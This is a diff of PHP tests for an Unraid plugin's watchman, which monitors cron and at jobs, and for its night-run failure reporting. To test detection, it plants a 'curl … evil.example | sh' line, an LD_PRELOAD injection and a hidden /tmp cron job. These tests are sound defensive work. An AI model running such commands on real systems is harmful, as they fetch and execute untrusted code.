@@ -16921,6 +16921,200 @@ function testWatchmanAtPlugin(): void
 }
 
 /**
+ * The night shift at boot (2026-10-22, the owner's server after a power-off): Unraid installs the plugins one after the
+ * other and starts emhttpd after them — meanwhile a plugin's .cron is written anew (empty a moment), its plugin isn't
+ * installed yet, and ich777's Plugin-Update-Helper is queued through atd. None of it is news; a plugin's .cron is
+ * judged by its lines (empty or gone a moment, then the same lines: nothing), and entries of it from before close at
+ * the next look.
+ */
+function testWatchmanBootNoise(): void
+{
+    $now = strtotime('2026-10-22 10:00:00');
+    $tmp = sys_get_temp_dir() . '/office-tests-bootnoise-' . getmypid();
+    $src = "$tmp/src";
+    $day = "$tmp/data/watchman";
+    $night = "$tmp/run/nightshift";
+    $ram = "$tmp/run/watchman-mirror.json";
+    $flash = "$tmp/flashmirror/watchman-mirror.json";
+    foreach (['crontabs', 'cron.d', 'logplugins', 'atjobs', 'agents', 'extra', 'ssh', 'flash/user.scripts/scripts/Sicherung', 'flash/nvidia-driver',
+              'emhttp/nvidia-driver', 'proc/1', 'proc/2', 'usrbin', 'aside'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    @mkdir("$tmp/run", 0700, true);
+    @mkdir("$tmp/flashmirror", 0700, true);
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/logplugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'etc_passwd' => "$src/passwd", 'crontabs' => "$src/crontabs", 'cron_d' => "$src/cron.d",
+              'cron_files' => "$src/flash", 'userscripts' => "$src/flash/user.scripts", 'atjobs' => "$src/atjobs", 'agents' => "$src/agents",
+              'emhttp_plugins' => "$src/emhttp", 'update_helper' => "$src/usrbin/plugin_update_helper", 'emhttpd' => "$src/proc", 'boot_id' => "$tmp/boot_id"];
+    $boot1 = 'bbbbbbbb-0000-4000-8000-000000000001';
+    $boot2 = 'bbbbbbbb-0000-4000-8000-000000000002';
+    file_put_contents("$tmp/boot_id", "$boot1\n");
+    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
+    file_put_contents($paths['go'], "#!/bin/bash\n/usr/local/sbin/emhttp\n");
+    file_put_contents($paths['syslog'], '');
+    file_put_contents("$src/cron.d/root", "*/1 * * * * /usr/local/emhttp/plugins/dynamix/scripts/monitor &> /dev/null\n");
+    file_put_contents("$src/crontabs/root", "# nothing of root's own\n");
+    foreach (['unraid-secretary-office', 'user.scripts', 'nvidia-driver'] as $p) {
+        file_put_contents("$src/logplugins/$p.plg", "<PLUGIN name=\"$p\" version=\"2026.10.01\" pluginURL=\"https://raw.githubusercontent.com/someone/$p/master/$p.plg\">\n");
+    }
+    file_put_contents("$src/emhttp/nvidia-driver/README.md", "**Nvidia Driver**\n");
+    $cronFile = "$src/flash/user.scripts/customSchedule.cron";
+    $cron = "# Generated cron schedule for user.scripts\n"
+          . "0 4 * * * /usr/local/emhttp/plugins/user.scripts/startCustom.php /boot/config/plugins/user.scripts/scripts/Sicherung/script > /dev/null 2>&1\n\n";
+    file_put_contents($cronFile, $cron);
+    file_put_contents("$src/flash/user.scripts/scripts/Sicherung/script", "#!/bin/bash\necho Familienfilme\n");
+    $helper = "#!/bin/bash\n# Plugin-Update-Helper version: 2023.06.01\n# by ich777\ninotifywait -q /boot/changes.txt -e move_self,delete_self\n";
+    file_put_contents("$src/flash/nvidia-driver/plugin_update_helper", $helper);
+    file_put_contents($paths['update_helper'], $helper);
+    file_put_contents("$src/proc/1/comm", "init\n");
+    file_put_contents("$src/proc/2/comm", "emhttpd\n");
+    // atd's job as the helper's plugin queues it (echo "/usr/bin/plugin_update_helper" | at now -M), from rc.local at boot
+    $head = fn (int $uid = 0) => "#!/bin/sh\n# atrun uid=$uid gid=0\n# mail root 0\numask 22\nSHELL=/bin/bash; export SHELL\nPWD=/; export PWD\n"
+        . "HOME=/root; export HOME\nPATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin; export PATH\n"
+        . "cd / || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n";
+    $wrap = fn (string $cmds) => "\${SHELL:-/bin/sh} << 'marcinDELIMITER3a2b1c0d'\n$cmds\nmarcinDELIMITER3a2b1c0d\n";
+    $envBefore = getenv('OFFICE_NOTIFY_BIN');
+    putenv("OFFICE_NOTIFY_BIN=$tmp/no-notify");
+    $docker = fn () => [];
+    $acks = "$tmp/acks.json";
+    $openKeys = function (array $book): array {
+        $k = array_column(array_values(array_filter($book, 'watchmanOpen')), 'key');
+        sort($k);
+        return $k;
+    };
+
+    // the pieces: emhttpd up (at boot: the plugins installed); the helper's job and whose copy it is
+    same('boot: emhttpd up — the plugins are installed; not looked at — yes', [true, true],
+        [watchmanBootPluginsDone($paths), watchmanBootPluginsDone(array_diff_key($paths, ['emhttpd' => 1]))]);
+    file_put_contents("$src/proc/2/comm", "rc.local\n");
+    same('boot: no emhttpd yet — Unraid still installs the plugins', false, watchmanBootPluginsDone($paths));
+    file_put_contents("$src/proc/2/comm", "emhttpd\n");
+    same('helper: the installed plugin whose copy /usr/bin/plugin_update_helper is', 'nvidia-driver', watchmanUpdateHelper($paths));
+    same('helper: its job exactly (as root, an environment that runs nothing else)', [true, false, false, false, false],
+        [watchmanAtHelperJob($head() . $wrap(WATCH_UPDATE_HELPER)), watchmanAtHelperJob($head(1000) . $wrap(WATCH_UPDATE_HELPER)),
+         watchmanAtHelperJob($head() . $wrap(WATCH_UPDATE_HELPER . '; curl -s https://evil.example/x | sh')),
+         watchmanAtHelperJob($head() . $wrap('/tmp/plugin_update_helper')),
+         watchmanAtHelperJob(str_replace("PWD=/; export PWD\n", "LD_PRELOAD=/tmp/x\\.so; export LD_PRELOAD\n", $head()) . $wrap(WATCH_UPDATE_HELPER))]);
+    file_put_contents($paths['update_helper'], $helper . "curl -s https://evil.example/x | sh\n");
+    $other = watchmanUpdateHelper($paths);
+    rename("$src/logplugins/nvidia-driver.plg", "$src/aside/nvidia-driver.plg");
+    file_put_contents($paths['update_helper'], $helper);
+    same('helper: not a plugin\'s copy (another content), or its plugin not installed — none', [null, null], [$other, watchmanUpdateHelper($paths)]);
+    rename("$src/aside/nvidia-driver.plg", "$src/logplugins/nvidia-driver.plg");
+
+    // the day: he takes over; his baseline goes to the flash for the night shift
+    watchmanRound($paths, $day, 1000, $now, $docker, false, $acks);
+    $r = watchmanRound($paths, $day, 1000, $now + 300, $docker, false, $acks);
+    same('boot: the day — the plugin\'s schedule known, nothing new', [[], 'flash'], [$r['added'], watchmanMirrorWrite($day, $ram, $flash, $now + 300, $boot1)]);
+
+    // a power-off and a boot: no RAM mirror; rc.local installs the office's plugin first (the night shift starts with it),
+    // user.scripts after it (writing its .cron anew: empty a moment, then the same lines), then ich777's plugin (the helper
+    // into /usr/bin, its job queued); emhttpd only after all of them
+    @unlink($ram);
+    file_put_contents("$tmp/boot_id", "$boot2\n");
+    $t = $now + 7200;
+    rename("$src/logplugins/user.scripts.plg", "$src/aside/user.scripts.plg");
+    rename("$src/logplugins/nvidia-driver.plg", "$src/aside/nvidia-driver.plg");
+    unlink($paths['update_helper']);
+    touch($paths['plugins'], $t - 10);
+    file_put_contents("$src/proc/2/comm", "rc.local\n");
+    file_put_contents($cronFile, '');
+    touch($cronFile, $t);
+    $r1 = watchmanNightRound($paths, $night, $t, false, $docker, $ram, $flash, $boot2);
+    file_put_contents($cronFile, $cron);
+    touch($cronFile, $t + 30);
+    $r2 = watchmanNightRound($paths, $night, $t + 300, false, $docker, $ram, $flash, $boot2);
+    rename("$src/aside/user.scripts.plg", "$src/logplugins/user.scripts.plg");
+    rename("$src/aside/nvidia-driver.plg", "$src/logplugins/nvidia-driver.plg");
+    touch($paths['plugins'], $t + 400);
+    file_put_contents($paths['update_helper'], $helper);
+    file_put_contents("$src/atjobs/a0000901cc2a6c", $head() . $wrap(WATCH_UPDATE_HELPER));
+    touch($paths['atjobs'], $t + 410);
+    file_put_contents("$src/proc/2/comm", "emhttpd\n");
+    $r3 = watchmanNightRound($paths, $night, $t + 600, false, $docker, $ram, $flash, $boot2);
+    $book = watchmanLoad($night)['book'];
+    $pl = array_values(array_filter($book, fn ($e) => $e['kind'] === 'at_plugin'));
+    same('boot: nothing new — not while the plugins install, not after (no schedule changed, none of no plugin, no foreign at job)',
+        ['flash', [], [], [], []], [$r1['begun']['from'] ?? null, $r1['added'], $r2['added'], $r3['added'], $openKeys($book)]);
+    same('boot: the helper\'s job — a line noted by himself, naming the plugin whose copy it is',
+        [1, 'nvidia-driver', 'Nvidia Driver', WATCH_UPDATE_HELPER, 'plugin', false],
+        [count($pl), $pl[0]['p']['plugin'] ?? null, $pl[0]['p']['name'] ?? null, $pl[0]['p']['file'] ?? null, $pl[0]['by'] ?? null, watchmanOpen($pl[0] ?? [])]);
+    same('boot: nothing for the team lead', [], array_column(watchmanFindings($book), 'id'));
+    unlink("$src/atjobs/a0000901cc2a6c");
+    touch($paths['atjobs'], $t + 700);
+
+    // the day again: a plugin writes its .cron anew while he looks — empty, gone, back with the same lines: no news; the
+    // lines that went are remembered (in the flash's mirror too: hashes and times); a new line is told
+    $d = $t + 1000;
+    $round = function (int $at) use ($paths, $day, $docker, $acks): array {
+        return watchmanRound($paths, $day, 1000, $at, $docker, false, $acks)['added'];
+    };
+    file_put_contents($cronFile, "# Generated cron schedule for user.scripts\n");
+    touch($cronFile, $d);
+    $emptied = $round($d + 10);
+    $was = watchmanMirror(watchmanLoad($day), $boot2, $d + 20, true)['baseline']['sched']['files']['user.scripts/customSchedule.cron']['was'] ?? [];
+    unlink($cronFile);
+    $gone = $round($d + 300);
+    $goneKnown = watchmanLoad($day)['baseline']['sched']['files']['user.scripts/customSchedule.cron']['gone'] ?? null;
+    $page = watchmanPageState($day, $d + 310, false);
+    file_put_contents($cronFile, $cron);
+    touch($cronFile, $d + 400);
+    $back = $round($d + 600);
+    same('cron file: emptied, gone, back with the same lines — no news; gone it is known still, not on the page', [[], [], [], [$d + 10], $d + 300, false],
+        [$emptied, $gone, $back, array_values($was), $goneKnown,
+         in_array('user.scripts/customSchedule.cron', array_column((array) ($page['watch']['sched']['files'] ?? []), 'file'), true)]);
+    file_put_contents($cronFile, $cron . "*/5 * * * * /tmp/.x/run\n");
+    touch($cronFile, $d + 700);
+    $added = $round($d + 900);
+    file_put_contents($cronFile, $cron);
+    touch($cronFile, $d + 1000);
+    $round($d + 1200);
+    $e = array_values(array_filter(watchmanLoad($day)['book'], fn ($e) => ($e['key'] ?? '') === 'cron_file:user.scripts/customSchedule.cron'));
+    same('cron file: a new line is told; the file as before again — the entry closed by himself (back)', [['cron_file'], ['*/5 * * * * /tmp/.x/run'], 'back', false],
+        [$added, $e[0]['p']['jobs'] ?? null, $e[0]['by'] ?? null, watchmanOpen($e[0] ?? [])]);
+
+    // «I know, thanks» reaches the flash at once (else a reboot within the hour starts the night on the old normal); a
+    // change alone waits for the hour
+    $fm = "$tmp/flashmirror/ack-mirror.json";
+    $cron2 = $cron . "15 3 * * 0 /usr/local/emhttp/plugins/user.scripts/startCustom.php /boot/config/plugins/user.scripts/scripts/Sicherung/script > /dev/null 2>&1\n";
+    $first = watchmanMirrorWrite($day, $ram, $fm, $d + 1250, $boot2);
+    touch($fm, $d + 1250);
+    file_put_contents($cronFile, $cron2);
+    touch($cronFile, $d + 1260);
+    $told = $round($d + 1270);
+    $held = watchmanMirrorWrite($day, $ram, $fm, $d + 1280, $boot2);
+    watchmanAck('*', $day, $d + 1290, false);
+    $acked = watchmanMirrorWrite($day, $ram, $fm, $d + 1300, $boot2);
+    same('flash mirror: a change within the hour waits; «I know, thanks» goes at once, the new line normal there', ['flash', ['cron_file'], 'ram', 'flash', 2],
+        [$first, $told, $held, $acked, count((array) (readJson($fm)['baseline']['sched']['files']['user.scripts/customSchedule.cron']['lines'] ?? []))]);
+    file_put_contents($cronFile, $cron);
+    touch($cronFile, $d + 1310);
+    $round($d + 1320);
+
+    // the owner's server: the three entries the night shift's look during the boot left open (before this fix) close at the next look
+    $old = watchmanLoad($day);
+    $stale = [watchmanEntry('cron_file', 'cron_file:user.scripts/customSchedule.cron', $t + 200, ['file' => 'user.scripts/customSchedule.cron', 'plugin' => 'user.scripts',
+                  'new' => false, 'office' => false, 'lines' => 1, 'jobs' => ['0 4 * * * user.scripts/startCustom.php …'], '_f' => 'x']),
+              watchmanEntry('cron_file_foreign', 'cron_file_foreign:user.scripts/customSchedule.cron', $t + 100, ['file' => 'user.scripts/customSchedule.cron',
+                  'plugin' => 'user.scripts', 'new' => false, 'office' => false, 'lines' => 1, 'jobs' => [], '_f' => 'x']),
+              watchmanEntry('at_job', 'at_job:a0000901cc2a6c', $t + 300, ['job' => 'a0000901cc2a6c', 'when' => $t, 'cmd' => WATCH_UPDATE_HELPER, 'uid' => 0]),
+              watchmanEntry('at_job', 'at_job:a0000a01cc2a6c', $t + 300, ['job' => 'a0000a01cc2a6c', 'when' => $t, 'cmd' => WATCH_UPDATE_HELPER, 'uid' => 1000])];
+    watchmanSave($day, $old, ['book' => array_merge($old['book'], $stale)]);
+    same('stale: open before the look', 4, count(array_filter(watchmanLoad($day)['book'], fn ($e) => watchmanOpen($e) && ($e['time'] ?? 0) < $d)));
+    $r = watchmanRound($paths, $day, 1000, $d + 1500, $docker, false, $acks);
+    $byKey = array_column(watchmanLoad($day)['book'], null, 'key');
+    same('stale: the schedule as he knows it — both closed (back); the helper\'s job as root closed (plugin); not as root it stays',
+        [[], 'back', 'back', 'plugin', null, ['at_job:a0000a01cc2a6c']],
+        [$r['added'], $byKey['cron_file:user.scripts/customSchedule.cron']['by'] ?? null, $byKey['cron_file_foreign:user.scripts/customSchedule.cron']['by'] ?? null,
+         $byKey['at_job:a0000901cc2a6c']['by'] ?? null, $byKey['at_job:a0000a01cc2a6c']['by'] ?? null, $openKeys(watchmanLoad($day)['book'])]);
+
+    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
+    @unlink(watchmanLockFile($day, 'book'));
+    @unlink(watchmanLockFile($night, 'book'));
+    exec('rm -rf ' . escapeshellarg($tmp));
+}
+
+/**
  * The night watchman's watch over what starts on its own: root's own crontab next to Unraid's (new
  * lines, lines in both, the office's own lines, programs gone, the syslog as evidence), the plugins'
  * .cron files, User Scripts, atd's queue, the notification agents — all on copies in a temporary folder.
@@ -45161,7 +45355,9 @@ function testNightRun(): void
         'level' => function (array $g, array $hh, bool $wake) use ($level, $at) { $at('measure'); return $level(); },
         'jack_status' => function () use (&$p, $G) {
             return ['pool' => ['waiting_bytes' => $p['wait'] * $G], 'cleanup' => ['bytes_done' => ($p['gave'] ?? 0) * $G, 'bytes_planned' => $p['w'] * $G],
-                    'fill' => ['bytes_planned' => min($p['wait'], max(0, 800 - $p['nm'] - $p['j'] + $p['w'] - $p['d'])) * $G]];
+                    'fill' => ['bytes_planned' => min($p['wait'], max(0, 800 - $p['nm'] - $p['j'] + $p['w'] - $p['d'])) * $G]]
+                // MediaCache's files not copied / not brought back (his step's, set by jack_job; none: an older status)
+                + (($p['st_failed'] ?? null) !== null ? ['failed' => $p['st_failed']] : []);
         },
         'jack_live' => fn () => ['recent' => [['name' => 'Film/a.mkv', 'bytes' => 7, 'from' => 'cache', 'to' => 'array'], ['name' => 1, 'bytes' => 'x']]],
         'jack_runs' => function () use (&$runs) { return $runs; },
@@ -45172,6 +45368,7 @@ function testNightRun(): void
         'jack_job' => function (array $args) use (&$p, &$calls, &$runs, &$inside, $dir, $at) {
             $at('jack');
             $calls[] = 'jack ' . implode(' ', $args);
+            $p['st_failed'] = array_shift($p['failed_q']);    // one per step of his, in order
             $inside[] = [nightRunning($dir), moverelliBusy($dir), nightInside()];
             $exit = array_shift($p['jack_exit']) ?? 0;
             if ($exit === 0 && in_array('--nofill', $args, true)) {
@@ -45213,7 +45410,7 @@ function testNightRun(): void
         },
     ];
     $night = fn () => nightState($dir) ?? [];
-    $fresh = fn (array $x) => $x + ['nm' => 300, 'j' => 0, 'w' => 0, 'd' => 0, 'wait' => 0, 'burst' => 0, 'jack_exit' => [], 'her_stall' => false];
+    $fresh = fn (array $x) => $x + ['nm' => 300, 'j' => 0, 'w' => 0, 'd' => 0, 'wait' => 0, 'burst' => 0, 'jack_exit' => [], 'her_stall' => false, 'failed_q' => []];
 
     // (1) 850: Jack Emby gives back his 50 watched; his 60 waiting come first — she pushes the others below X (until 740) so his
     // fetch ends at X; downloads (40) arrive meanwhile: a recheck round, her part again; then he fetches his 60
@@ -45321,6 +45518,27 @@ function testNightRun(): void
         [['jack run --night --nofill', 'her run --night --fill-until=740G --fill-pool=cache', 'jack run --night'], true, 1],
         [$calls, $n['missed'] ?? null, $n['round'] ?? null]);
     $notified = [];
+
+    // (2c) 2026-10-22 (seen on a real server): his fetch lost 2 files (someone else's rsync --delete took their temporary
+    // copies) — the night was «done» and her card green while Unraid said «4 problems». The night says it: result `errors`,
+    // `jack_failed` 2 (files, not log lines), his step's count kept; a step of his without `failed` (an older status) counts none
+    $calls = [];
+    $notified = [];
+    $p = $fresh(['j' => 400, 'w' => 50, 'd' => 150, 'wait' => 60, 'failed_q' => [['fill' => 0, 'back' => 0], ['fill' => 2, 'back' => 0, 'files' => [], 'retried' => 1]]]);
+    $exit = nightRun(['run', '--office']);
+    $n = $night();
+    same('night run jack failed: his fetch lost 2 files — the night ends «errors» (exit 0), jack_failed 2, his fill step counts 2, his free step none, nothing extra told',
+        [0, 'errors', 2, [null, 2], []], [$exit, $n['result'] ?? null, $n['jack_failed'] ?? null,
+         array_map(fn ($x) => $x['failed'] ?? null, array_values(array_filter($n['steps'] ?? [], fn ($x) => ($x['who'] ?? '') === 'jack'))), $notified]);
+    same('night run jack failed: … what the pages read of it (moverelliNightShort keeps jack_failed)', [2, 'errors'],
+        [moverelliNightShort($n)['jack_failed'] ?? null, moverelliNightShort($n)['result'] ?? null]);
+    $calls = [];
+    $p = $fresh(['j' => 400, 'w' => 50, 'd' => 150, 'wait' => 60, 'failed_q' => [['fill' => 0, 'back' => 0], ['fill' => 'x', 'back' => 0]]]);
+    nightRun(['run']);
+    same('night run jack failed: a `failed` not in its shape counts nothing — done', ['ok', null], [$night()['result'] ?? null, $night()['jack_failed'] ?? null]);
+    same('night run jack failed: nightJackFailed — fill + back, only ints, never below 0', [3, 0, 0, 1],
+        [nightJackFailed(['failed' => ['fill' => 2, 'back' => 1]]), nightJackFailed(['failed' => ['fill' => '2', 'back' => 1]]), nightJackFailed([]),
+         nightJackFailed(['failed' => ['fill' => -4, 'back' => 1]])]);
 
     // (3) his budget crowds the others out: 600 used, 300 wait — the others' 100 all pushed under X, he fetches 300 up to X: told
     $calls = [];
@@ -45640,6 +45858,163 @@ JS);
         check("night lang $l: the words there, «after Jack Emby» gone", isset($lang['night.tonight'], $lang['rc.phase.recheck'], $lang['notify.night_missed'], $lang['check.night_schedule'])
             && !isset($lang['schedule.after'], $lang['check.after_idle'], $lang['check.moverelli_before_jack']));
     }
+    hardeningRm($tmp);
+}
+
+/**
+ * Jack Streamer after a joint run on a real server (2026-10-22): two of his fill's copies lost (someone else's
+ * `rsync --delete` into the share took rsync's temporary files — MediaCache now copies such a file once more), the night
+ * «done» and Ms. Moverelli's card green while Unraid said «4 problems» (two ERROR lines per file), and «I'm laying things
+ * out» on his page during a 5-s «What's next». The night's part: testNightRun (2c).
+ */
+function testJackChaos(): void
+{
+    $tmp = hardeningTmp('jack-chaos');
+    // (1) MediaCache: a vanished temporary file is copied once more, failed files counted per file (its own tests)
+    $run = (string) file_get_contents(OFFICE_DIR . '/mediacache/mediacache_run.py');
+    check('jack chaos: MediaCache knows rsync\'s «rename … No such file or directory» (code 23) and copies such a file once more — the fill and the rsync give-back',
+        str_contains($run, 'VANISHED_RE = re.compile(') && substr_count($run, 'self.rsync_copy(cmd, dst,') === 2 && str_contains($run, 'self.result["failed"] = dict(self.failed_files'));
+    check('jack chaos: … listed among the office\'s changes in its README', str_contains((string) file_get_contents(OFFICE_DIR . '/mediacache/README.md'), '«vanished», 2026-10-22'));
+    if (needsPython(__FUNCTION__, 'MediaCache\'s vanished tests')) {
+        [$exit, $out, $err] = run(['python3', '-I', '-B', '-m', 'unittest', 'discover', '-s', OFFICE_DIR . '/mediacache/tests', '-p', 'test_vanished.py'], 120);
+        check('jack chaos: MediaCache\'s tests — vanished once: copied on the second try; twice, or another error: one failed file, no third try; a stop: none',
+            $exit === 0 && str_contains($out . $err, 'OK') && preg_match('/Ran ([6-9]|\d\d) tests/', $out . $err) === 1, $out . $err);
+    }
+
+    // (2) the notification counts files, not log lines; an older status (no `failed`) as before; the gather unchanged
+    same('jack chaos: jackFailedFiles — in its shape only (vanished optional)', [['fill' => 2, 'back' => 1, 'vanished' => 2], null, null, ['fill' => 0, 'back' => 0, 'vanished' => 0]],
+        [jackFailedFiles(['failed' => ['fill' => 2, 'back' => 1, 'vanished' => 2, 'files' => []]]), jackFailedFiles(['failed' => ['fill' => '2', 'back' => 0]]), jackFailedFiles([]),
+         jackFailedFiles(['failed' => ['fill' => -1, 'back' => 0, 'vanished' => 'x']])]);
+    $bin = "$tmp/notify";
+    file_put_contents($bin, "#!/bin/bash\nprintf '%s\\n' \"\$@\" >> " . escapeshellarg("$tmp/notified") . "\n");
+    chmod($bin, 0755);
+    $envBefore = [getenv('OFFICE_NOTIFY_BIN'), getenv('OFFICE_NOTIFY_STAMP')];
+    putenv("OFFICE_NOTIFY_BIN=$bin");
+    putenv("OFFICE_NOTIFY_STAMP=$tmp/stamp");
+    $sent = function (array $status, string $tool = 'embycache') use ($tmp): string {
+        @unlink("$tmp/notified");
+        @unlink("$tmp/stamp");
+        jackNotify($tool, 'run', (string) ($status['result'] ?? 'ok'), $status, 0);
+        return (string) @file_get_contents("$tmp/notified");
+    };
+    $two = $sent(['result' => 'ok', 'errors' => 4, 'warnings' => 0, 'cleanup' => ['done' => 0], 'fill' => ['planned' => 370, 'done' => 368],
+                  'failed' => ['fill' => 2, 'back' => 0, 'vanished' => 2, 'files' => [['phase' => 'fill', 'rel' => 'Serien/A/a.mkv', 'why' => 'vanished']], 'retried' => 2]]);
+    check('jack chaos: the notification — a warning, «2 files not copied to the pool — they stay on the array.», why in plain words (another program deleted the half copies, the sources untouched), never «4 problems»',
+        str_contains($two, "-i\nwarning") && str_contains($two, '2 files not copied to the pool — they stay on the array. Another program deleted the half-copied files (e.g. a sync with --delete into this share) — the sources are untouched; the next run tries again.')
+        && !str_contains($two, '4 problems'), $two);
+    $back = $sent(['result' => 'ok', 'errors' => 3, 'failed' => ['fill' => 1, 'back' => 1, 'files' => [], 'retried' => 0]]);
+    check('jack chaos: … both ways, each counted («1 file … 1 file not brought back to the array»), no reason without vanished ones',
+        str_contains($back, '1 file not copied to the pool — it stays on the array. 1 file not brought back to the array — it stays on the pool.') && !str_contains($back, 'Another program'), $back);
+    $old = $sent(['result' => 'ok', 'errors' => 4]);
+    check('jack chaos: … an older status without `failed`: its problems counted as before', str_contains($old, '4 problems.'), $old);
+    $gather = $sent(['result' => 'errors', 'errors' => 1, 'conflicts' => 1, 'failed' => ['fill' => 9, 'back' => 0]], 'gather');
+    check('jack chaos: … the gather\'s problems as before', str_contains($gather, '2 problems.') && !str_contains($gather, 'not copied'), $gather);
+    check('jack chaos: a vanished copy that went through on its second try is no problem — nothing told',
+        $sent(['result' => 'ok', 'errors' => 0, 'warnings' => 1, 'failed' => ['fill' => 0, 'back' => 0, 'files' => [], 'retried' => 1]]) === '');
+    putenv($envBefore[0] === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore[0]");
+    putenv($envBefore[1] === false ? 'OFFICE_NOTIFY_STAMP' : "OFFICE_NOTIFY_STAMP=$envBefore[1]");
+
+    // (3) the pages under node: his bubble, notice and «Last run» during a look; her «Last run» and the last joint run
+    $node = testsNode();
+    if ($node === '') {
+        check('jack chaos: node is missing here - skipped', true);
+        hardeningRm($tmp);
+        return;
+    }
+    file_put_contents("$tmp/t.js", <<<'JS'
+const fs = require('fs');
+globalThis.OFFICE_DESK_TESTS = {};
+const T = (k, p) => k + (p ? ' ' + JSON.stringify(p) : '');
+const mk = (tag, cls, text) => ({ tag, cls, text, textContent: text == null ? '' : String(text), children: [], hidden: false, disabled: false, checked: false, dataset: {}, style: {},
+  append(...c) { this.children.push(...c); }, appendChild(c) { this.children.push(c); return c; }, setAttribute() {}, scrollIntoView() {}, addEventListener() {} });
+globalThis.document = { createTextNode: (t) => t };
+globalThis.Office = { sections: (o) => ({ spec: o, el: {}, active: () => '', note: () => ({ tile: '' }), places: () => [], mount: () => false, pick() {}, render() {}, clear() {} }),
+  scope: () => T, t: T, el: mk, fmt: { cron: (c) => 'C' + c, relative: (t) => 'R' + t, size: (b) => b + ' B', number: (n) => String(n), time: (t) => 'T' + t, duration: (s) => s + 's', date: (t) => 'D' + t },
+  desk: () => {}, places: () => {}, placesFrom: () => {}, store: () => null, agent: { running: true }, place: (k, n) => n, go: () => {}, sectionHead: () => mk('h'), stat: (o) => o,
+  runSteps: (steps, at) => ({ ...mk('div', 'steps'), steps, at }), runBar: () => mk('div', 'bar'), runRate: () => null, dialog: () => {}, freshState: async () => true, toast: () => {},
+  errorText: (e) => 'err:' + e.key, api: { post: async () => ({ ok: true }) } };
+for (const f of process.argv.slice(2)) (0, eval)(fs.readFileSync(f, 'utf8'));
+const m = OFFICE_DESK_TESTS.moverelli;
+const e = OFFICE_DESK_TESTS.jack;
+const texts = (n) => (typeof n === 'string' ? [n] : [n.textContent, n.title, ...n.children.flatMap(texts)].filter(Boolean));
+const out = {};
+// his page while EmbyCache runs: a report, a dry run, a real run
+const real = { tool: 'embycache', mode: 'run', by: 'night', started: 100, finished: 200, result: 'ok',
+  status: { mode: 'run', errors: 4, warnings: 0, cleanup: { done: 0, planned: 0 }, fill: { done: 368, planned: 370 }, failed: { fill: 2, back: 0, files: [], retried: 0 } } };
+const jstate = (mode) => ({ emby: [{}], python: true, configured: true, gather: {}, cache: { files: 1, bytes: 1 }, schedules: {}, night: {},
+  jobs: { gather: { running: false }, embycache: mode ? { running: true, mode, started: 300 } : { running: false } }, history: [real] });
+out.bubble = {};
+out.look = {};
+out.tile = {};
+for (const mode of ['report', 'dry', 'run', null]) {
+  e.setState(jstate(mode));
+  out.bubble[mode] = e.bubbleText();
+  out.look[mode] = String(e.lookRun());
+  const t = e.lastRunTile({});
+  out.tile[mode] = [t.value, t.sub, t.alert];
+}
+out.failed = [e.failedText(real.status), e.failedText({ failed: { fill: 0, back: 1 } }), e.failedText({ errors: 4 }), e.failedText({ failed: { fill: '2', back: 0 } }),
+  e.failedText({ failed: { fill: 1, back: 0, vanished: 1 } })];
+out.summary = e.runSummary(real);
+// her page: the joint run's last night with his 2 failed files; her own «Last run» record of that night
+const herRun = { mode: 'run', by: 'night', started: 150, finished: 160, result: 'ok', status: { moved: 0, left: 0 } };
+const night = { mode: 'run', started: 100, finished: 2000, result: 'errors', jack_failed: 2, round: 1, phase: 'done', jack: true };
+const base = { configured: true, unraid: { ok: true, version: '7.3.3', needed: '7.3.2' }, job: {}, schedule: { enabled: true, frequency: 'custom', custom: '0 2 * * *' }, history: [herRun], shares: [],
+  mover: { off: true }, foreign: { tuning: { installed: false, active: false, lines: [] }, scripts: [] }, settings: { global: { min_age: 0, move_when_used_above: 80 } }, last: null,
+  night: { jack: true, plan: { measured: false }, last: night } };
+m.setState(base);
+out.lastNight = [m.lastNightText(night), m.lastNightText({ ...night, result: 'ok', jack_failed: undefined }), m.lastNightText({ ...night, result: 'missed', end_pct: 81 })];
+const ht = m.lastRunTile({});
+out.herTile = [ht.sub, ht.alert];
+out.section = texts(m.scheduleSection());
+const warnChip = [];
+const find = (n) => { if (typeof n !== 'string') { if (n.cls === 'chip warn') warnChip.push([n.textContent, n.title]); n.children.forEach(find); } };
+find(m.scheduleSection());
+out.chip = warnChip;
+m.setState({ ...base, night: { jack: true, plan: { measured: false }, last: { ...night, result: 'ok', jack_failed: undefined } } });
+const ok = m.lastRunTile({});
+out.herOk = [ok.sub, ok.alert];
+// her own run before the night (not of it): nothing of his said
+m.setState({ ...base, history: [{ ...herRun, started: 50, finished: 60 }] });
+out.herBefore = m.lastRunTile({}).sub;
+console.log(JSON.stringify(out));
+JS);
+    [, $out, $err] = run([$node, "$tmp/t.js", testsNightHelpersJs($tmp), OFFICE_WEB . '/desks/moverelli/desk.js', OFFICE_WEB . '/desks/jack/desk.js'], 30);
+    $j = json_decode(trim((string) $out), true) ?? [];
+    check('jack chaos page: it runs', $j !== [], $out . $err);
+    same('jack chaos page: his bubble says what runs — «looking at what\'s next», «a dry run», laying out only for a real run', ['bubble.running_report', 'bubble.running_dry', 'bubble.running'],
+        [$j['bubble']['report'] ?? null, $j['bubble']['dry'] ?? null, $j['bubble']['run'] ?? null]);
+    same('jack chaos page: lookRun — report and dry only', ['report', 'dry', 'null', 'null'], [$j['look']['report'] ?? 'x', $j['look']['dry'] ?? 'x', $j['look']['run'] ?? 'x', $j['look']['null'] ?? 'x']);
+    same('jack chaos page: «Last run» during a look keeps the last real run, «now: What\'s next (since …)» first; a real run «running since»',
+        ['R200', 'last.looking {"mode":"mode.report","time":"T300"}', 'last.running {"time":"T300"}', ['mode.run']],
+        [$j['tile']['report'][0] ?? null, $j['tile']['report'][1][0] ?? null, $j['tile']['run'][0] ?? null, $j['tile']['run'][1] ?? null]);
+    same('jack chaos page: … the run\'s files not laid out under it, the tile a warning', ['failed.fill {"n":2}', true],
+        [end($j['tile']['null'][1]) ?: null, $j['tile']['null'][2] ?? null]);
